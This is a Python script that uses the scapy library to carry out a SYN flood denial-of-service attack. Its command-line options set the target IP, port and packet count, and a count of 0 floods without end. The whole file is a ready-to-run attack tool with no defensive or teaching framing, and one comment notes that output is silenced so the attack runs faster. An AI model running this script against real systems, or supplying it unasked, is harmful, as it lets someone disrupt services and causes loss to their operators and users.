# Usage : python syn_flood.py -t <target_ip> -p <target_port> -c <count>

from scapy.all import *
import argparse

def syn_flood(target_ip, target_port, count):
    if count == 0:
        while True:
            # Send SYN packets to the target IP and port
            send(IP(dst=target_ip)/TCP(dport=target_port, flags='S'), verbose=0) # Verbose = 0 to avoid printing output and slowing down the attack and S flag to indicate SYN packet
    else:
        for i in range(count):
            # Send SYN packets to the target IP and port
            send(IP(dst=target_ip)/TCP(dport=target_port, flags='S'), verbose=0)

def main():
    parser = argparse.ArgumentParser(description='SYN Flooding Attack')
    parser.add_argument('-t', '--target', help='Target IP', required=True)
    parser.add_argument('-p', '--port', help='Target Port', required=True, type=int)
    parser.add_argument('-c', '--count', help='Number of packets to send (0 for infinite)', required=False, type=int, default=1000)
    args = parser.parse_args()

    syn_flood(args.target, args.port, args.count)

if __name__ == '__main__':
    main()
